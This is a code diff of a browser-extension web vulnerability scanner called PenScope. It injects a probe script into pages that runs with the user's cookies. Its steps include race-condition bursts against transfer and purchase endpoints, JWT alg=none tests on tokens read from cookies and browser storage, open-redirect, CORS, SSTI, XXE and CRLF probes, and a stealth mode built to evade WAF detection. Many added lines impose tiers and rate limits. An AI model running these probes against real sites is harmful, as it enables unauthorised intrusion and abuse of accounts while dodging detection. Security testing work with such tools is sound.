@@ -1,4 +1,5 @@
-// PenScope v5.9 — Background Service Worker
+import {STACK_ATTACK_PACKS} from "./probe/stack-packs.js";
+// PenScope v6.2.6 — Background Service Worker (ES module)
 // v5.1: Full Endpoint Discovery + Probe Engine (22 steps)
 // v5.2: IndexedDB + CacheStorage + JWT + Route classification + Permission matrix + IDOR
 // v5.3: POST body + API response scan + Coverage + Event listeners + Shadow DOM + Memory mining
@@ -14,6 +15,7 @@ const CONFIG = {
   MAX_BODY_PREVIEW: 50000,
   MAX_BODY_DEEP: 500000,
   MAX_BODY_API: 200000,
+  MAX_BODY_5XX: 100000,
   MAX_POST_BODY: 10000,
   MAX_POST_BODIES: 200,
   MAX_HEADER_INTEL: 200,
@@ -29,6 +31,54 @@ const CONFIG = {
 };
 
 const state={};const _seen={};const _debugTabs=new Set();const _pending={};const _scripts={};
+const _loadTimers=new Map();
+let _regexPack={secrets:[],respPatterns:[],_raw:null,_loaded:false};
+async function _loadRegexPack(){
+  try{
+    const url=chrome.runtime.getURL("regex-pack.json");
+    const r=await fetch(url);
+    if(!r.ok)throw new Error("regex-pack.json fetch "+r.status);
+    const raw=await r.json();
+    function compile(arr){
+      return (arr||[]).map(p=>{
+        try{return Object.assign({},p,{regex:new RegExp(p.pattern,p.flags||"g")});}
+        catch(e){console.warn("[PenScope] regex compile fail",p.name,e.message);return null;}
+      }).filter(Boolean);
+    }
+    _regexPack={
+      secrets:compile(raw.secrets),
+      respPatterns:compile(raw.respPatterns),
+      _raw:raw,
+      _loaded:true
+    };
+    try{
+      if(typeof RESP_PATTERNS!=="undefined"&&Array.isArray(RESP_PATTERNS)){
+        const have=new Set(RESP_PATTERNS.map(p=>p.name));
+        let added=0;
+        _regexPack.respPatterns.forEach(p=>{
+          if(have.has(p.name))return;
+          RESP_PATTERNS.push({name:p.name,regex:p.regex,sev:p.severity||"medium",desc:p.desc||p.name});
+          added++;
+        });
+        if(added)console.log("[PenScope] regex-pack: merged "+added+" respPatterns into RESP_PATTERNS (total "+RESP_PATTERNS.length+")");
+      }
+    }catch(e){console.warn("[PenScope] respPattern merge failed",e.message||e);}
+    console.log("[PenScope] regex-pack loaded: "+_regexPack.secrets.length+" secrets, "+_regexPack.respPatterns.length+" respPatterns");
+  }catch(e){console.warn("[PenScope] regex-pack load failed",e.message||e);}
+}
+_loadRegexPack();
+function trackLoadTimer(tabId,id){
+  let s=_loadTimers.get(tabId);
+  if(!s){s=new Set();_loadTimers.set(tabId,s);}
+  s.add(id);
+  return id;
+}
+function clearLoadTimers(tabId){
+  const s=_loadTimers.get(tabId);
+  if(!s)return;
+  for(const id of s){try{clearTimeout(id);}catch(e){}}
+  _loadTimers.delete(tabId);
+}
 setInterval(()=>{const now=Date.now();for(const k of Object.keys(_pending)){if(_pending[k]._ts&&now-_pending[k]._ts>CONFIG.PENDING_TTL)delete _pending[k];}},CONFIG.PENDING_CLEANUP_INTERVAL);
 
 // v5.8: State persistence via chrome.storage.session — survives service worker restarts so a
@@ -53,12 +103,11 @@ async function flushDirty(){
     }catch(e){console.warn('[PenScope] persist',e.message||e);}
   }
 }
+const _NON_PERSISTED_FIELDS=new Set(["endpointIndex","_loadTimers","methodSuggestions","apiVersions","inlineHandlers","metaTags"]);
 function serializeTabState(d){
-  // Strip non-serializable + trim large arrays to stay under the session storage quota
   const snap={};
   for(const k in d){
-    if(k==="endpointIndex")continue;
-    if(k==="_loadTimers")continue;
+    if(_NON_PERSISTED_FIELDS.has(k))continue;
     if(typeof d[k]==="function")continue;
     snap[k]=d[k];
   }
@@ -128,6 +177,25 @@ async function restoreStateOnStartup(){
       }
     });
   }catch(e){console.warn('[PenScope] restore',e.message||e);}
+  try{
+    const allAlarms=await chrome.alarms.getAll();
+    if(Array.isArray(allAlarms)&&allAlarms.length){
+      const cmAlarms=allAlarms.filter(a=>a&&typeof a.name==="string"&&a.name.startsWith("ps:cm:"));
+      if(cmAlarms.length){
+        const tabIds=cmAlarms.map(a=>parseInt(a.name.substring(6))).filter(n=>!isNaN(n));
+        const liveTabs=new Set();
+        await Promise.all(tabIds.map(id=>new Promise(res=>{
+          chrome.tabs.get(id,t=>{void chrome.runtime.lastError;if(t&&t.id)liveTabs.add(t.id);res();});
+        })));
+        for(const a of cmAlarms){
+          const id=parseInt(a.name.substring(6));
+          if(isNaN(id)||!liveTabs.has(id)){
+            try{chrome.alarms.clear(a.name,()=>{void chrome.runtime.lastError;});}catch(e){}
+          }
+        }
+      }
+    }
+  }catch(e){console.warn('[PenScope] alarm sweep',e.message||e);}
 }
 restoreStateOnStartup();
 
@@ -392,7 +460,22 @@ repeaterHistory:[],
 authContexts:[{name:"Anonymous",cookies:{},headers:{},notes:"No auth — baseline for IDOR/BAC comparison"}],
 authActive:"Anonymous",
 startTime:Date.now()};}return state[tabId];}
-function seen(tabId,ns,key){const k=`${tabId}:${ns}`;if(!_seen[k])_seen[k]=new Set();if(_seen[k].has(key))return true;_seen[k].add(key);return false;}
+const _SEEN_CAPS={ep:5000,req:5000,host:1000,sub:1000,secret:2000,script:5000,sm:2000,"sm-dbg":2000,"sm-net":2000,pmap:1000,arb:2000,pb:2000,rb:5000,ss:5000,err:1000,redir:2000,"redir-d":2000,grpc:1000,tech:1000,"tech-hdr":500,hi:500,auth:1000,apiver:500,swagger:500,pp:2000,puuid:2000,pnum:2000,"3p":1000,ws:500,ctx:500,log:500,audit:500,dr:5000,recnew:5000,recfind:2000,smsec:2000,secrec:2000,secmem:2000,mem:2000};
+const _SEEN_DEFAULT_CAP=2000;
+function seen(tabId,ns,key){
+  const k=`${tabId}:${ns}`;
+  let m=_seen[k];
+  if(!m){m=new Map();_seen[k]=m;}
+  if(m.has(key))return true;
+  m.set(key,1);
+  const cap=_SEEN_CAPS[ns]||_SEEN_DEFAULT_CAP;
+  if(m.size>cap){
+    const overflow=m.size-cap;
+    let i=0;
+    for(const ek of m.keys()){if(i>=overflow)break;m.delete(ek);i++;}
+  }
+  return false;
+}
 
 // Tag rules (25)
 const TAG_RULES=[
@@ -673,7 +756,8 @@ chrome.debugger.onEvent.addListener((source,method,params)=>{
       const isJSON=(meta.mimeType||"").includes("json");
       const isAPI=/\/api\//i.test(meta.url||"");
       const isWasm=(meta.url||"").split("?")[0].endsWith(".wasm")||(meta.mimeType||"").includes("wasm");
-      const bodyLimit=isJS?500000:isJSON?200000:isAPI?200000:isWasm?2000000:50000;
+      const is5xx=meta.status>=500;
+      const bodyLimit=isJS?500000:isJSON?200000:isAPI?200000:isWasm?2000000:is5xx?CONFIG.MAX_BODY_5XX:50000;
       chrome.debugger.sendCommand({tabId},"Network.getResponseBody",{requestId:params.requestId},(result)=>{
         if(chrome.runtime.lastError||!result||!result.body)return;
         // CDP returns non-UTF-8 bodies (WASM, images, fonts, protobufs) as base64. Decode WASM for binary
@@ -730,28 +814,25 @@ chrome.debugger.onEvent.addListener((source,method,params)=>{
       break;}
     case "Page.loadEventFired":case "Page.domContentEventFired":{
       if(method==="Page.loadEventFired"){
-        if(!tab._loadTimers)tab._loadTimers=[];
-        tab._loadTimers.forEach(id=>clearTimeout(id));tab._loadTimers=[];
-        tab._loadTimers.push(setTimeout(()=>runRuntimeExtraction(tabId),CONFIG.EXTRACTION_DELAY));
-        tab._loadTimers.push(setTimeout(()=>extractAllScriptSources(tabId),CONFIG.SCRIPT_EXTRACT_DELAY_1));
-        tab._loadTimers.push(setTimeout(()=>extractAllScriptSources(tabId),CONFIG.SCRIPT_EXTRACT_DELAY_2));
-        tab._loadTimers.push(setTimeout(()=>runCoverageAnalysis(tabId),10000));
-        tab._loadTimers.push(setTimeout(()=>mineMemoryStrings(tabId),4000));
-        tab._loadTimers.push(setTimeout(()=>{const t=T(tabId);if(!t.memoryStrings.length){t._memoryMined=false;mineMemoryStrings(tabId);}},12000));
-        tab._loadTimers.push(setTimeout(()=>dumpEventListeners(tabId),5000));
-        tab._loadTimers.push(setTimeout(()=>pierceShadowDOM(tabId),5500));
-        tab._loadTimers.push(setTimeout(()=>detectEncodedBlobs(tabId),6500));
-        // v5.3.1: Network intelligence
-        tab._loadTimers.push(setTimeout(()=>extractDNSPrefetch(tabId),3500));
-        tab._loadTimers.push(setTimeout(()=>scanIframes(tabId),4500));
-        tab._loadTimers.push(setTimeout(()=>{const t=T(tabId);if(!t.iframeScan.length){t._iframesScanned=false;scanIframes(tabId);}},11000));
-        tab._loadTimers.push(setTimeout(()=>extractPerfEntries(tabId),7000));
-        tab._loadTimers.push(setTimeout(()=>extractCSSContent(tabId),7500));
-        // v5.4: New attack surface extractors
-        tab._loadTimers.push(setTimeout(()=>detectWasmModules(tabId),8000));
-        tab._loadTimers.push(setTimeout(()=>hookBroadcastChannels(tabId),8500));
-        tab._loadTimers.push(setTimeout(()=>detectWebRTCLeaks(tabId),9000));
-        tab._loadTimers.push(setTimeout(()=>detectCoopCoep(tabId),9500));
+        clearLoadTimers(tabId);
+        trackLoadTimer(tabId,setTimeout(()=>runRuntimeExtraction(tabId),CONFIG.EXTRACTION_DELAY));
+        trackLoadTimer(tabId,setTimeout(()=>extractAllScriptSources(tabId),CONFIG.SCRIPT_EXTRACT_DELAY_1));
+        trackLoadTimer(tabId,setTimeout(()=>extractAllScriptSources(tabId),CONFIG.SCRIPT_EXTRACT_DELAY_2));
+        trackLoadTimer(tabId,setTimeout(()=>runCoverageAnalysis(tabId),10000));
+        trackLoadTimer(tabId,setTimeout(()=>mineMemoryStrings(tabId),4000));
+        trackLoadTimer(tabId,setTimeout(()=>{const t=T(tabId);if(!t.memoryStrings.length){t._memoryMined=false;mineMemoryStrings(tabId);}},12000));
+        trackLoadTimer(tabId,setTimeout(()=>dumpEventListeners(tabId),5000));
+        trackLoadTimer(tabId,setTimeout(()=>pierceShadowDOM(tabId),5500));
+        trackLoadTimer(tabId,setTimeout(()=>detectEncodedBlobs(tabId),6500));
+        trackLoadTimer(tabId,setTimeout(()=>extractDNSPrefetch(tabId),3500));
+        trackLoadTimer(tabId,setTimeout(()=>scanIframes(tabId),4500));
+        trackLoadTimer(tabId,setTimeout(()=>{const t=T(tabId);if(!t.iframeScan.length){t._iframesScanned=false;scanIframes(tabId);}},11000));
+        trackLoadTimer(tabId,setTimeout(()=>extractPerfEntries(tabId),7000));
+        trackLoadTimer(tabId,setTimeout(()=>extractCSSContent(tabId),7500));
+        trackLoadTimer(tabId,setTimeout(()=>detectWasmModules(tabId),8000));
+        trackLoadTimer(tabId,setTimeout(()=>hookBroadcastChannels(tabId),8500));
+        trackLoadTimer(tabId,setTimeout(()=>detectWebRTCLeaks(tabId),9000));
+        trackLoadTimer(tabId,setTimeout(()=>detectCoopCoep(tabId),9500));
       }
       break;}
 
@@ -1149,7 +1230,14 @@ function extractAllScriptSources(tabId){
     });
   });
 }
-chrome.debugger.onDetach.addListener((source)=>{_debugTabs.delete(source.tabId);if(state[source.tabId])state[source.tabId].deepEnabled=false;});
+chrome.debugger.onDetach.addListener((source)=>{
+  const tabId=source.tabId;
+  _debugTabs.delete(tabId);
+  if(state[tabId])state[tabId].deepEnabled=false;
+  delete _scripts[tabId];
+  Object.keys(_pending).forEach(k=>{if(k.startsWith(`${tabId}:`))delete _pending[k];});
+  try{clearLoadTimers(tabId);}catch(e){}
+});
 
 // -------------------------------------------------------
 // 3b. STEALTH RUNTIME EXTRACTION — via Runtime.evaluate
@@ -1574,8 +1662,26 @@ async function runProbe(tabId,aggroLevel,customHeaders,recursive,stealth){
   // === Build the eval script — runs in page context with cookies ===
   // ctx is injected via window.__ps_ctx to avoid ALL template literal escaping issues
   const evalScript=`(async function(){
+var _F=window.fetch?window.fetch.bind(window):null;
+var _P=window.Promise;
+var _J=window.JSON;
+var _O=window.Object;
+var _AC=window.AbortController;
+var _ST=window.setTimeout;
+var _CT=window.clearTimeout;
+var _atob=window.atob?window.atob.bind(window):null;
+var _btoa=window.btoa?window.btoa.bind(window):null;
+var _URL=window.URL;
+var _USP=window.URLSearchParams;
+var _Arr=window.Array;
+var _Str=window.String;
+var _Num=window.Number;
+var _Re=window.RegExp;
+var _Sym=window.Symbol;
+var fetch=_F,Promise=_P,JSON=_J,Object=_O,AbortController=_AC,setTimeout=_ST,clearTimeout=_CT,atob=_atob,btoa=_btoa,URL=_URL,URLSearchParams=_USP,Array=_Arr,String=_Str,Number=_Num,RegExp=_Re,Symbol=_Sym;
 var R={graphql:null,sourceMaps:[],swagger:[],probes:[],options:[],suffixes:[],errors:[],requests:0,newEndpoints:[],bacResults:[],methodResults:[],corsResults:[],contentTypeResults:[],openRedirects:[],raceResults:[],hppResults:[],subdomains:[],graphqlFuzz:[],jwtAlgResults:[],hostHeaderResults:[],cachePoisonResults:[],idorAutoResults:[],authRemovalResults:[],csrfResults:[],grpcReflection:null,compressionResults:[],wsHijackResults:[],cachePoisonProbe:[],timingOracle:[],coopCoepBypass:[],storagePartition:[],paramDiscovery:[],sstiResults:[],xxeResults:[],crlfResults:[],versionDowngrade:[],protoPollution:[]};
 try{
+if(!_F||!_J||!_P){R.errors.push("FATAL: critical globals unavailable (fetch/JSON/Promise overridden to non-function)");return _J?_J.stringify(R):'{"errors":["JSON unavailable"]}';}
 var ctx=window.__ps_ctx||{};
 R.errors.push("ctx loaded: smUrls="+ctx.smUrls.length+" gql="+ctx.gqlPaths.length+" api="+ctx.apiPaths.length+" prefixes="+ctx.prefixes.length+" probes="+ctx.allProbes.length);
 
@@ -1590,42 +1696,164 @@ function mergeCustomHeaders(baseHeaders){
   for(var k2 in ch){if(Object.prototype.hasOwnProperty.call(ch,k2))out[k2]=ch[k2];}
   return out;
 }
+var TIER_CONTRACT={
+  careful:{methods:{"GET":1,"HEAD":1,"OPTIONS":1},maxParallel:1,minSpacingMs:200,allowBodyPayloads:false,allowRaceBursts:false},
+  medium:{methods:{"GET":1,"HEAD":1,"OPTIONS":1,"POST":1},maxParallel:3,minSpacingMs:0,allowBodyPayloads:true,allowRaceBursts:false},
+  full:{methods:{"GET":1,"HEAD":1,"OPTIONS":1,"POST":1,"PUT":1,"PATCH":1,"DELETE":1},maxParallel:10,minSpacingMs:0,allowBodyPayloads:true,allowRaceBursts:true}
+};
+function gate(method,level){
+  var m=(method||"GET").toUpperCase();
+  var lvl=level||ctx.aggroLevel||"medium";
+  var tier=TIER_CONTRACT[lvl]||TIER_CONTRACT.medium;
+  if(!tier.methods[m])return{allow:false,reason:m+" not allowed in "+lvl+" tier"};
+  return{allow:true,tier:tier};
+}
+R._tierBlocked=[];
+function gateBlocked(method,url,reason){
+  R._tierBlocked.push({method:(method||"GET").toUpperCase(),url:(url||"").substring(0,120),reason:reason});
+  if(R._tierBlocked.length<=20)R.errors.push("gate-block: "+(method||"GET")+" "+(url||"").substring(0,80)+" — "+reason);
+}
+var STEP_PLAN=[
+  {id:1,name:"GraphQL introspection",method:"POST"},
+  {id:2,name:"SourceMap fetch",method:"GET"},
+  {id:3,name:"Swagger fetch",method:"GET"},
+  {id:4,name:"Robots+Sitemap",method:"GET"},
+  {id:5,name:"Well-known probes",method:"HEAD"},
+  {id:6,name:"OPTIONS endpoints",method:"OPTIONS"},
+  {id:7,name:"Suffix bruteforce",method:"HEAD"},
+  {id:8,name:"BAC auto-test",method:"POST"},
+  {id:9,name:"Method tampering",method:"PUT"},
+  {id:10,name:"CORS reflection",method:"GET"},
+  {id:11,name:"Content-type tampering",method:"POST"},
+  {id:12,name:"Open redirect",method:"GET"},
+  {id:13,name:"Race condition",method:"POST"},
+  {id:14,name:"HPP",method:"GET"},
+  {id:15,name:"Subdomain mining",method:"NONE"},
+  {id:16,name:"GraphQL fuzz",method:"POST"},
+  {id:17,name:"JWT alg=none",method:"GET"},
+  {id:18,name:"Host header injection",method:"GET"},
+  {id:19,name:"Cache poisoning",method:"GET"},
+  {id:20,name:"IDOR auto-test",method:"POST"},
+  {id:21,name:"Auth removal",method:"GET"},
+  {id:22,name:"CSRF validation",method:"POST"},
+  {id:23,name:"gRPC reflection",method:"POST"},
+  {id:24,name:"Compression oracle",method:"POST"},
+  {id:29,name:"Storage partition",method:"NONE"},
+  {id:30,name:"Recursive API discovery",method:"GET"},
+  {id:31,name:"Param discovery",method:"GET"},
+  {id:32,name:"SSTI",method:"GET"},
+  {id:33,name:"XXE",method:"POST"},
+  {id:34,name:"CRLF",method:"GET"},
+  {id:35,name:"Version downgrade",method:"GET"},
+  {id:36,name:"Proto pollution",method:"POST"},
+  {id:37,name:"SSRF param probing",method:"GET"},
+  {id:38,name:"NoSQL operator injection",method:"POST"},
+  {id:39,name:"GraphQL alias amplification",method:"POST"},
+  {id:40,name:"GraphQL batch amplification",method:"POST"},
+  {id:41,name:"Cache deception",method:"GET"},
+  {id:42,name:"Subdomain takeover heuristic",method:"GET"},
+  {id:43,name:"TabNabbing detection",method:"NONE"},
+  {id:44,name:"postMessage origin correlation",method:"NONE"},
+  {id:45,name:"Service Worker scope abuse",method:"NONE"}
+];
+R._tierSelfCheck=(function(){
+  var planned=[],blocked=[];
+  for(var spi=0;spi<STEP_PLAN.length;spi++){
+    var s=STEP_PLAN[spi];
+    if(s.method==="NONE"){planned.push({id:s.id,name:s.name,method:"none",allow:true});continue;}
+    var g=gate(s.method,ctx.aggroLevel);
+    var entry={id:s.id,name:s.name,method:s.method,allow:g.allow,reason:g.reason||""};
+    planned.push(entry);
+    if(!g.allow)blocked.push(entry);
+  }
+  R.errors.push("Tier self-check ["+(ctx.aggroLevel||"medium")+"]: "+planned.length+" planned, "+blocked.length+" blocked: "+blocked.map(function(x){return"step "+x.id+" ("+x.method+")";}).join(", "));
+  return{plan:planned,blocked:blocked,tier:ctx.aggroLevel||"medium"};
+})();
+var _lastRequestTs=0;
+async function _enforceCarefulSpacing(){
+  if(ctx.aggroLevel!=="careful")return;
+  if(!_lastRequestTs){_lastRequestTs=Date.now();return;}
+  var elapsed=Date.now()-_lastRequestTs;
+  if(elapsed<200)await delay(200-elapsed);
+  _lastRequestTs=Date.now();
+}
 async function sf(url,opts,maxBody){
+  var _method=(opts&&opts.method)||"GET";
+  var _g=gate(_method,ctx.aggroLevel);
+  if(!_g.allow){gateBlocked(_method,url,_g.reason);return{url:url,status:0,ok:false,error:"gated:"+_g.reason,body:"",ct:"",allow:"",location:"",server:""};}
+  await _enforceCarefulSpacing();
+  if(_rateLimitHostBanned(url))return{url:url,status:0,ok:false,error:"host rate-limit banned",body:"",ct:"",allow:"",location:"",server:""};
   R.requests++;
-  try{
-    var c=new AbortController();
-    var t=setTimeout(function(){c.abort();},12000);
-    var finalOpts=Object.assign({redirect:"follow",signal:c.signal},opts||{});
-    finalOpts.headers=mergeCustomHeaders(finalOpts.headers);
-    // Always include credentials so session cookies + custom Authorization are both sent
-    if(!finalOpts.credentials)finalOpts.credentials="include";
-    var r=await fetch(url,finalOpts);
-    clearTimeout(t);
-    var body="";
-    var isHead=opts&&opts.method&&opts.method.toUpperCase()==="HEAD";
-    if(!isHead&&(r.status<400||r.status===401||r.status===403||r.status===405)){
-      var ct=r.headers.get("content-type")||"";
-      if(!ct.includes("image")&&!ct.includes("video")&&!ct.includes("audio")&&!ct.includes("octet-stream")){
-        try{body=await r.text();if(body.length>(maxBody||300000))body=body.substring(0,maxBody||300000);}catch(e){}
+  for(var attempt=0;attempt<=3;attempt++){
+    var resp;
+    try{
+      var c=new AbortController();
+      var t=setTimeout(function(){c.abort();},12000);
+      var finalOpts=Object.assign({redirect:"follow",signal:c.signal},opts||{});
+      finalOpts.headers=mergeCustomHeaders(finalOpts.headers);
+      if(!finalOpts.credentials)finalOpts.credentials="include";
+      var r=await fetch(url,finalOpts);
+      clearTimeout(t);
+      var body="";
+      var isHead=opts&&opts.method&&opts.method.toUpperCase()==="HEAD";
+      if(!isHead&&(r.status<400||r.status===401||r.status===403||r.status===405||r.status>=500)){
+        var ct=r.headers.get("content-type")||"";
+        if(!ct.includes("image")&&!ct.includes("video")&&!ct.includes("audio")&&!ct.includes("octet-stream")){
+          try{body=await r.text();if(body.length>(maxBody||300000))body=body.substring(0,maxBody||300000);}catch(e){}
+        }
       }
-    }
-    return{url:url,status:r.status,ok:r.ok,ct:r.headers.get("content-type")||"",body:body,size:body.length,
-      allow:r.headers.get("allow")||r.headers.get("Access-Control-Allow-Methods")||"",
-      location:r.headers.get("location")||"",
-      server:r.headers.get("server")||""};
-  }catch(e){return{url:url,status:0,ok:false,error:e.message,body:"",ct:"",allow:"",location:"",server:""};}
+      resp={url:url,status:r.status,ok:r.ok,ct:r.headers.get("content-type")||"",body:body,size:body.length,
+        allow:r.headers.get("allow")||r.headers.get("Access-Control-Allow-Methods")||"",
+        location:r.headers.get("location")||"",
+        server:r.headers.get("server")||""};
+    }catch(e){return{url:url,status:0,ok:false,error:e.message,body:"",ct:"",allow:"",location:"",server:""};}
+    if(resp.status!==429&&resp.status!==503)return resp;
+    var hitState=_rateLimitNoteHit(url);
+    if(hitState==="banned"||attempt>=3){R.errors.push("rate-limit "+resp.status+" hit (attempt "+attempt+"): "+url.substring(0,120));return resp;}
+    await delay(Math.pow(2,attempt)*1000+Math.floor(Math.random()*500));
+  }
+  return{url:url,status:0,ok:false,error:"unreachable",body:"",ct:"",allow:"",location:"",server:""};
 }
 function delay(ms){
-  // v5.8: Stealth mode — add 0-80% jitter to every delay and a larger pause every 10 requests
-  // to break up the probe's cadence. WAFs tend to pattern-match rapid sequential requests, so
-  // even small randomization significantly reduces detection rates.
   if(ctx.stealth){
     ms=ms+Math.floor(Math.random()*(ms*0.8));
     if(R.requests>0&&R.requests%10===0)ms+=200+Math.floor(Math.random()*600);
-    // v5.9: micro-jitter between individual requests (not just between steps)
     if(R.requests>0&&R.requests%3===0)ms+=Math.floor(Math.random()*150);
   }
   return new Promise(function(r){setTimeout(r,ms);});
+}
+var _rateLimitState={hosts:{},stepSkipped:{}};
+function _rateLimitHostKey(url){try{return new URL(url).hostname;}catch(e){return"_default";}}
+function _rateLimitNoteHit(url){
+  var h=_rateLimitHostKey(url);
+  if(!_rateLimitState.hosts[h])_rateLimitState.hosts[h]={hits:0,bannedAt:0};
+  _rateLimitState.hosts[h].hits++;
+  if(_rateLimitState.hosts[h].hits>5){_rateLimitState.hosts[h].bannedAt=Date.now();return"banned";}
+  return"hit";
+}
+function _rateLimitHostBanned(url){
+  var h=_rateLimitHostKey(url);
+  return !!(_rateLimitState.hosts[h]&&_rateLimitState.hosts[h].bannedAt);
+}
+async function sfWithBackoff(url,opts,maxBody,stepName){
+  if(_rateLimitHostBanned(url))return{url:url,status:0,ok:false,error:"host rate-limit banned",body:"",ct:"",allow:"",location:"",server:""};
+  var maxRetries=3;
+  for(var attempt=0;attempt<=maxRetries;attempt++){
+    var resp=await sf(url,opts,maxBody);
+    if(resp.status!==429&&resp.status!==503)return resp;
+    var hitState=_rateLimitNoteHit(url);
+    if(hitState==="banned"){
+      if(stepName)R.errors.push("rate-limit ban: skipping further "+stepName+" requests on "+_rateLimitHostKey(url));
+      return resp;
+    }
+    if(attempt>=maxRetries){
+      if(stepName)R.errors.push("rate-limit reached on "+stepName+" after "+maxRetries+" retries: "+url);
+      return resp;
+    }
+    var backoff=Math.pow(2,attempt)*1000+Math.floor(Math.random()*500);
+    await delay(backoff);
+  }
+  return{url:url,status:0,ok:false,error:"unreachable",body:"",ct:"",allow:"",location:"",server:""};
 }
 // v5.9: Fisher-Yates shuffle. Used to randomize path orderings in stealth mode so scanners
 // don't hit /admin, /.env, /.git, /wp-admin in that order every time — which is the #1
@@ -1684,7 +1912,9 @@ function scanBodyForFindings(body){
 }
 
 R.errors.push("STEP 1: GraphQL ("+ctx.gqlPaths.length+" endpoints)");
-// === 1. GRAPHQL INTROSPECTION ===
+if(!gate("POST",ctx.aggroLevel).allow){
+  R.errors.push("STEP 1 skipped: GraphQL introspection requires POST (medium+ tier)");
+}else
 for(var gi=0;gi<ctx.gqlPaths.length;gi++){
   var gp=ctx.gqlPaths[gi];
   var gUrl=gp.startsWith("http")?gp:location.origin+gp;
@@ -1829,6 +2059,9 @@ R.errors.push("STEP 5: Probes ("+ctx.allProbes.length+" paths)");
 // === 5. WELL-KNOWN PATH PROBING ===
 // Use redirect:"manual" so 302→login doesn't look like a real 200 hit
 async function probe(url){
+  var _g=gate("HEAD",ctx.aggroLevel);
+  if(!_g.allow){gateBlocked("HEAD",url,_g.reason);return{status:0,error:"gated:"+_g.reason};}
+  await _enforceCarefulSpacing();
   R.requests++;
   try{
     var c=new AbortController();
@@ -1963,6 +2196,9 @@ for(var ci=0;ci<ctx.apiPaths.length&&ci<30;ci++){
   var cUrl=location.origin+cPath;
   for(var co=0;co<corsOrigins.length;co++){
     try{
+      var _gCors=gate("GET",ctx.aggroLevel);
+      if(!_gCors.allow){gateBlocked("GET",cUrl,_gCors.reason);continue;}
+      await _enforceCarefulSpacing();
       R.requests++;
       var cc=new AbortController();
       var ct2=setTimeout(function(){cc.abort();},8000);
@@ -1991,10 +2227,11 @@ for(var ci=0;ci<ctx.apiPaths.length&&ci<30;ci++){
 }
 
 R.errors.push("STEP 11: Content-Type Confusion ("+ctx.postBodiesCtx.length+" POST endpoints)");
-// === 11. CONTENT-TYPE CONFUSION ===
+if(!gate("POST",ctx.aggroLevel).allow){
+  R.errors.push("STEP 11 skipped: Content-Type Confusion requires POST (medium+ tier)");
+}else{
 var ctTypes=["text/plain","application/xml","application/x-www-form-urlencoded","multipart/form-data; boundary=----PenScope"];
 var ctTried=new Set();
-// Test POST endpoints with wrong content types
 var ctEndpoints=ctx.postBodiesCtx.length?ctx.postBodiesCtx:ctx.observedApis.filter(function(e){return e.method==="POST";}).slice(0,15);
 for(var cti=0;cti<ctEndpoints.length&&cti<20;cti++){
   var ctEp=ctEndpoints[cti];
@@ -2015,7 +2252,7 @@ for(var cti=0;cti<ctEndpoints.length&&cti<20;cti++){
   }
   if(cti%5===4)await delay(100);
 }
-
+}
 
 R.errors.push("STEP 12: Open Redirect");
 R.openRedirects=[];
@@ -2032,6 +2269,9 @@ for(var ori=0;ori<redirectEndpoints.length;ori++){
     redirectParams.forEach(function(rp){if(orParams.has(rp)){orParams.set(rp,orPayload);paramSet=true;}});
     if(!paramSet)orParams.set("redirect_uri",orPayload);
     try{
+      var _gOR=gate("GET",ctx.aggroLevel);
+      if(!_gOR.allow){gateBlocked("GET",orUrl,_gOR.reason);continue;}
+      await _enforceCarefulSpacing();
       R.requests++;
       var orc=new AbortController();
       var ort=setTimeout(function(){orc.abort();},8000);
@@ -2049,17 +2289,30 @@ for(var ori=0;ori<redirectEndpoints.length;ori++){
 
 R.errors.push("STEP 13: Race Condition");
 R.raceResults=[];
-if(ctx.aggroLevel==="medium"||ctx.aggroLevel==="full"){
+var _raceAllowed=(TIER_CONTRACT[ctx.aggroLevel||"medium"]||{}).allowRaceBursts;
+if(_raceAllowed){
   var raceEndpoints=ctx.postBodiesCtx.filter(function(p){var lp=p.path.toLowerCase();return lp.indexOf("redeem")>-1||lp.indexOf("transfer")>-1||lp.indexOf("purchase")>-1||lp.indexOf("claim")>-1||lp.indexOf("submit")>-1;}).slice(0,5);
   for(var ri=0;ri<raceEndpoints.length;ri++){
     var rEp=raceEndpoints[ri];
     try{
+      var _gRace=gate("POST",ctx.aggroLevel);
+      if(!_gRace.allow){gateBlocked("POST",rEp.path,_gRace.reason);continue;}
       var rPromises=[];
-      for(var rp=0;rp<10;rp++){R.requests++;rPromises.push(fetch(location.origin+rEp.path,{method:"POST",headers:{"Content-Type":rEp.contentType||"application/json"},body:rEp.body||"{}",credentials:"include"}).then(function(r){return r.text().then(function(b){return{status:r.status,body:b.substring(0,300)};});}).catch(function(e){return{status:0};}));}
+      var raceTimeout=function(){return new Promise(function(res){setTimeout(function(){res({status:0,body:"",timeout:true});},8000);});};
+      var _raceMax=(TIER_CONTRACT[ctx.aggroLevel||"medium"]||{}).maxParallel||3;
+      var _raceCount=Math.min(10,_raceMax);
+      for(var rp=0;rp<_raceCount;rp++){
+        R.requests++;
+        var raceFetch=fetch(location.origin+rEp.path,{method:"POST",headers:{"Content-Type":rEp.contentType||"application/json"},body:rEp.body||"{}",credentials:"include"})
+          .then(function(r){return r.text().then(function(b){return{status:r.status,body:b.substring(0,300)};});})
+          .catch(function(e){return{status:0,error:e.message||""};});
+        rPromises.push(Promise.race([raceFetch,raceTimeout()]));
+      }
       var rResults=await Promise.all(rPromises);
       var rSuccess=rResults.filter(function(r){return r.status===200||r.status===201;}).length;
+      var rTimeouts=rResults.filter(function(r){return r&&r.timeout;}).length;
       var rUnique=rResults.map(function(r){return r.body||"";}).filter(function(v,i,a){return a.indexOf(v)===i;}).length;
-      if(rSuccess>1||rUnique>1){R.raceResults.push({path:rEp.path,successCount:rSuccess,uniqueResponses:rUnique,severity:rSuccess>1?"high":"medium"});}
+      if(rSuccess>1||rUnique>1){R.raceResults.push({path:rEp.path,successCount:rSuccess,uniqueResponses:rUnique,timeouts:rTimeouts,severity:rSuccess>1?"high":"medium"});}
     }catch(e){}
     await delay(200);
   }
@@ -2116,6 +2369,18 @@ R.jwtAlgResults=[];
 if(ctx.aggroLevel==="full"){
   var jwtTokens=[];
   try{document.cookie.split(";").forEach(function(c){var val=c.trim().split("=").slice(1).join("=");if(val&&val.indexOf("eyJ")===0&&val.indexOf(".")>-1)jwtTokens.push({value:val,source:"cookie"});});}catch(e){}
+  try{
+    for(var lsi=0;lsi<localStorage.length;lsi++){
+      var lk=localStorage.key(lsi);var lv=localStorage.getItem(lk);
+      if(lv&&lv.indexOf("eyJ")===0&&lv.indexOf(".")>-1&&lv.length<8000)jwtTokens.push({value:lv,source:"localStorage."+lk});
+    }
+  }catch(e){}
+  try{
+    for(var ssi=0;ssi<sessionStorage.length;ssi++){
+      var sk=sessionStorage.key(ssi);var sv=sessionStorage.getItem(sk);
